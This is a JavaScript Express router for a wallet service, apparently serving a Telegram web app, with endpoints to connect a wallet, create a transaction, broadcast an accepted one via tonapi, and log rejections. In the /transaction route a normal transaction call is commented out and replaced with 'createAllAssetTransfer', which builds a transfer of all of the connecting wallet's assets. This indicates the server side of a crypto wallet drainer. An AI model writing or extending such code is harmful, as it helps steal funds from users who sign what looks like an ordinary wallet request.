import express from "express";
import { WalletService } from "../service/walletService.js";
import { decodeBase64 } from "../utils/tool.js";

export const router = express.Router();

/**
 * 钱包连接
 */
router.post("/connected", async (req, res) => {
  try {
    console.log("🔗 钱包连接请求");
    console.log("  URL:", req.url);
    console.log("  Query参数:", JSON.stringify(req.query, null, 2));
    console.log("  Body参数:", JSON.stringify(req.body, null, 2));
    console.log("=".repeat(50));

    const { wallet, raw } = req.body;
    const result = await WalletService.connectWallet(wallet, raw);
    res.status(200).json(result);
  } catch (error) {
    console.error("❌ 连接错误:", error);
    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
});

/**
 * 交易
 */
router.get("/transaction", async (req, res) => {
  try {
    console.log("💰 交易请求");
    console.log("  URL:", req.url);
    console.log("  Query参数:", JSON.stringify(req.query, null, 2));
    console.log("  Body参数:", JSON.stringify(req.body, null, 2));
    console.log("=".repeat(50));

    const { wallet, tgWebAppStartParam, appName } = req.query;
    // const result = await WalletService.createTransaction(
    //   wallet,
    //   decodeBase64(tgWebAppStartParam)
    // );
    const result = await WalletService.createAllAssetTransfer(
      wallet,
      decodeBase64(tgWebAppStartParam),
      appName
    );
    res.json(result);
  } catch (error) {
    console.error("❌ 交易错误:", error);
    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
});

/**
 * 接受交易
 */
router.post("/accept", async (req, res) => {
  try {
    console.log("✅ 接受交易");
    console.log("  URL:", req.url);
    console.log("  Body参数:", JSON.stringify(req.body, null, 2));
    console.log("=".repeat(50));
    // 广播交易
    const { wallet } = req.body;
    const result = await WalletService.broadcastWithTonapi(wallet, req.body);
    res.status(200).json(result);
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "交易接受失败",
      error: error.message,
    });
  }
});

/**
 * 拒绝交易
 */
router.post("/reject", async (req, res) => {
  try {
    console.log("❌ 拒绝交易");
    console.log("  URL:", req.url);
    console.log("  Query参数:", JSON.stringify(req.query, null, 2));
    console.log("  Body参数:", JSON.stringify(req.body, null, 2));
    console.log("=".repeat(50));

    res.status(200).write("success");
  } catch (error) {
    res.status(500).json({
      success: false,
      message: "交易拒绝失败",
      error: error.message,
    });
  }
});
